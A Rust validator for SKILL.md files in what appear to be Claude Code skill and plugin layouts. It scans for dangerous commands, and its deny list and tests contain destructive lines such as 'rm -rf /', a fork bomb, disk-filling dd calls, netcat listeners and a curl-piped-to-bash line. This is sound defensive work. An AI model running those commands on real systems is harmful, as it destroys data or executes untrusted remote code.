use anyhow::Result;
use std::path::Path;

#[derive(Debug)]
pub struct ValidationWarning {
    pub line: usize,
    pub message: String,
}

#[derive(Debug)]
pub struct ValidationResult {
    pub valid: bool,
    pub errors: Vec<String>,
    pub warnings: Vec<ValidationWarning>,
}

impl ValidationResult {
    fn new() -> Self {
        ValidationResult {
            valid: true,
            errors: Vec::new(),
            warnings: Vec::new(),
        }
    }

    fn add_error(&mut self, error: String) {
        self.valid = false;
        self.errors.push(error);
    }

    fn add_warning(&mut self, line: usize, message: String) {
        self.warnings.push(ValidationWarning { line, message });
    }
}

/// Find the SKILL.md file in a skill directory.
///
/// Supports two layouts:
/// 1. Flat: `SKILL.md` at root (standard skill)
/// 2. Plugin: `skills/*/SKILL.md` (Claude Code plugin layout)
pub fn find_skill_file(skill_path: &Path) -> Option<std::path::PathBuf> {
    // Check flat layout first
    let flat = skill_path.join("SKILL.md");
    if flat.exists() {
        return Some(flat);
    }

    // Check plugin layout: skills/*/SKILL.md
    let skills_dir = skill_path.join("skills");
    if skills_dir.is_dir() {
        if let Ok(entries) = std::fs::read_dir(&skills_dir) {
            for entry in entries.flatten() {
                if entry.path().is_dir() {
                    let candidate = entry.path().join("SKILL.md");
                    if candidate.exists() {
                        return Some(candidate);
                    }
                }
            }
        }
    }

    None
}

pub fn validate_skill(skill_path: &Path) -> Result<ValidationResult> {
    let mut result = ValidationResult::new();

    // Check 1: SKILL.md exists (flat or plugin layout)
    let skill_file = match find_skill_file(skill_path) {
        Some(path) => path,
        None => {
            result.add_error("SKILL.md not found (checked root and skills/*/SKILL.md)".to_string());
            return Ok(result);
        }
    };

    // Check 2: SKILL.md is readable as UTF-8
    let content = match std::fs::read_to_string(&skill_file) {
        Ok(c) => c,
        Err(e) => {
            result.add_error(format!("SKILL.md is not valid UTF-8: {}", e));
            return Ok(result);
        }
    };

    // Check 3: SKILL.md is not empty
    if content.trim().is_empty() {
        result.add_error("SKILL.md is empty".to_string());
        return Ok(result);
    }

    // Check 4: Basic markdown structure (has at least one heading)
    if !content.contains('#') {
        result.add_warning(0, "SKILL.md has no markdown headings".to_string());
    }

    // Check 5: Scan for potentially malicious commands
    scan_for_malicious_patterns(&content, &mut result);

    // Check 6: File size check (warn if > 1MB)
    if let Ok(metadata) = std::fs::metadata(&skill_file) {
        let size_mb = metadata.len() as f64 / 1024.0 / 1024.0;
        if size_mb > 1.0 {
            result.add_warning(
                0,
                format!(
                    "SKILL.md is large ({:.1}MB). Consider splitting into multiple files.",
                    size_mb
                ),
            );
        }
    }

    Ok(result)
}

fn scan_for_malicious_patterns(content: &str, result: &mut ValidationResult) {
    let dangerous_patterns = [
        // Destructive rm commands
        ("rm -rf /", "Attempts to delete root filesystem"),
        ("rm -rf ~", "Attempts to delete home directory"),
        ("rm -rf *", "Attempts to delete all files recursively"),
        (
            "rm -rf .",
            "Attempts to delete current directory recursively",
        ),
        // Fork bomb
        (":(){:|:&};:", "Fork bomb that crashes system"),
        // Disk operations
        ("dd if=/dev/zero", "Attempts to fill disk with zeros"),
        (
            "dd if=/dev/random",
            "Attempts to fill disk with random data",
        ),
        (
            "dd if=/dev/urandom",
            "Attempts to fill disk with random data",
        ),
        // Dangerous permissions
        ("chmod 777", "Sets overly permissive file permissions"),
        ("chmod -R 777", "Recursively sets dangerous permissions"),
        // System file modifications
        (">/etc/", "Attempts to modify system configuration"),
        (">>/etc/", "Attempts to append to system configuration"),
        ("rm /etc/", "Attempts to delete system configuration"),
        ("rm /bin/", "Attempts to delete system binaries"),
        ("rm /usr/", "Attempts to delete system files"),
        // Crypto mining indicators
        ("xmrig", "Possible cryptocurrency miner"),
        ("cryptonight", "Possible cryptocurrency miner"),
        // Network exfiltration
        ("nc -l", "Opens network listener"),
        ("netcat -l", "Opens network listener"),
    ];

    for (line_num, line) in content.lines().enumerate() {
        let line_lower = line.to_lowercase();

        // Skip markdown code block markers and comments
        if line.trim().starts_with("```") || line.trim().starts_with("#") {
            continue;
        }

        // Check for pipe to bash/sh from curl/wget
        if (line_lower.contains("curl") || line_lower.contains("wget"))
            && line_lower.contains("|")
            && (line_lower.contains("bash") || line_lower.contains("sh"))
        {
            result.add_warning(
                line_num + 1,
                "Downloads and executes code from internet (curl/wget | bash/sh)".to_string(),
            );
        }

        for (pattern, description) in &dangerous_patterns {
            // Simple pattern matching
            if line_lower.contains(&pattern.to_lowercase()) {
                result.add_warning(
                    line_num + 1,
                    format!(
                        "Potentially dangerous command: {} ({})",
                        pattern, description
                    ),
                );
            }
        }

        // Check for eval with variables
        if line_lower.contains("eval") && (line_lower.contains("$") || line_lower.contains("${")) {
            result.add_warning(
                line_num + 1,
                "eval with variable expansion can be dangerous".to_string(),
            );
        }

        // Check for sudo without clear purpose
        if line_lower.contains("sudo") && !line.contains("# ") && !line.contains("//") {
            result.add_warning(
                line_num + 1,
                "sudo command without explanation - verify this is necessary".to_string(),
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    #[test]
    fn test_valid_skill() {
        let temp_dir = TempDir::new().unwrap();
        let skill_path = temp_dir.path();
        fs::write(
            skill_path.join("SKILL.md"),
            "# Test Skill\n\nThis is a test skill.",
        )
        .unwrap();

        let result = validate_skill(skill_path).unwrap();
        assert!(result.valid);
        assert!(result.errors.is_empty());
    }

    #[test]
    fn test_missing_skill_file() {
        let temp_dir = TempDir::new().unwrap();
        let result = validate_skill(temp_dir.path()).unwrap();
        assert!(!result.valid);
        assert!(result.errors.iter().any(|e| e.contains("not found")));
    }

    #[test]
    fn test_empty_skill_file() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(temp_dir.path().join("SKILL.md"), "").unwrap();
        let result = validate_skill(temp_dir.path()).unwrap();
        assert!(!result.valid);
        assert!(result.errors.iter().any(|e| e.contains("empty")));
    }

    #[test]
    fn test_detects_dangerous_rm() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(
            temp_dir.path().join("SKILL.md"),
            "# Skill\n\n```bash\nrm -rf /\n```",
        )
        .unwrap();
        let result = validate_skill(temp_dir.path()).unwrap();
        assert!(result.valid); // Valid structure, but has warnings
        assert!(!result.warnings.is_empty());
        assert!(
            result
                .warnings
                .iter()
                .any(|w| w.message.contains("delete root"))
        );
    }

    #[test]
    fn test_detects_curl_pipe_bash() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(
            temp_dir.path().join("SKILL.md"),
            "# Skill\n\ncurl http://example.com/script.sh | bash",
        )
        .unwrap();
        let result = validate_skill(temp_dir.path()).unwrap();
        assert!(!result.warnings.is_empty());
        assert!(
            result
                .warnings
                .iter()
                .any(|w| w.message.contains("Downloads and executes"))
        );
    }

    #[test]
    fn test_no_markdown_headings_warning() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(temp_dir.path().join("SKILL.md"), "This is just plain text").unwrap();
        let result = validate_skill(temp_dir.path()).unwrap();
        assert!(result.valid);
        assert!(!result.warnings.is_empty());
        assert!(
            result
                .warnings
                .iter()
                .any(|w| w.message.contains("no markdown headings"))
        );
    }

    #[test]
    fn test_find_skill_file_flat_layout() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(temp_dir.path().join("SKILL.md"), "# Flat Skill").unwrap();
        let found = find_skill_file(temp_dir.path()).unwrap();
        assert_eq!(found, temp_dir.path().join("SKILL.md"));
    }

    #[test]
    fn test_find_skill_file_plugin_layout() {
        let temp_dir = TempDir::new().unwrap();
        let skill_dir = temp_dir.path().join("skills").join("my-skill");
        fs::create_dir_all(&skill_dir).unwrap();
        fs::write(skill_dir.join("SKILL.md"), "# Plugin Skill").unwrap();
        let found = find_skill_file(temp_dir.path()).unwrap();
        assert_eq!(found, skill_dir.join("SKILL.md"));
    }

    #[test]
    fn test_find_skill_file_prefers_flat() {
        let temp_dir = TempDir::new().unwrap();
        // Create both layouts
        fs::write(temp_dir.path().join("SKILL.md"), "# Flat Skill").unwrap();
        let skill_dir = temp_dir.path().join("skills").join("my-skill");
        fs::create_dir_all(&skill_dir).unwrap();
        fs::write(skill_dir.join("SKILL.md"), "# Plugin Skill").unwrap();
        // Flat should win
        let found = find_skill_file(temp_dir.path()).unwrap();
        assert_eq!(found, temp_dir.path().join("SKILL.md"));
    }

    #[test]
    fn test_find_skill_file_missing() {
        let temp_dir = TempDir::new().unwrap();
        assert!(find_skill_file(temp_dir.path()).is_none());
    }

    #[test]
    fn test_validate_plugin_layout() {
        let temp_dir = TempDir::new().unwrap();
        let skill_dir = temp_dir.path().join("skills").join("weekly-report");
        fs::create_dir_all(&skill_dir).unwrap();
        fs::write(
            skill_dir.join("SKILL.md"),
            "# Weekly Report\n\nGenerates weekly reports.",
        )
        .unwrap();
        // Also create the plugin manifest (not required for validation,
        // but mirrors real plugin structure)
        let plugin_dir = temp_dir.path().join(".claude-plugin");
        fs::create_dir_all(&plugin_dir).unwrap();
        fs::write(
            plugin_dir.join("plugin.json"),
            r#"{"name": "weekly-report"}"#,
        )
        .unwrap();

        let result = validate_skill(temp_dir.path()).unwrap();
        assert!(result.valid);
        assert!(result.errors.is_empty());
    }

    #[test]
    fn test_validate_missing_both_layouts() {
        let temp_dir = TempDir::new().unwrap();
        // Empty skills dir, no SKILL.md anywhere
        fs::create_dir_all(temp_dir.path().join("skills")).unwrap();
        let result = validate_skill(temp_dir.path()).unwrap();
        assert!(!result.valid);
        assert!(result.errors.iter().any(|e| e.contains("not found")));
    }
}
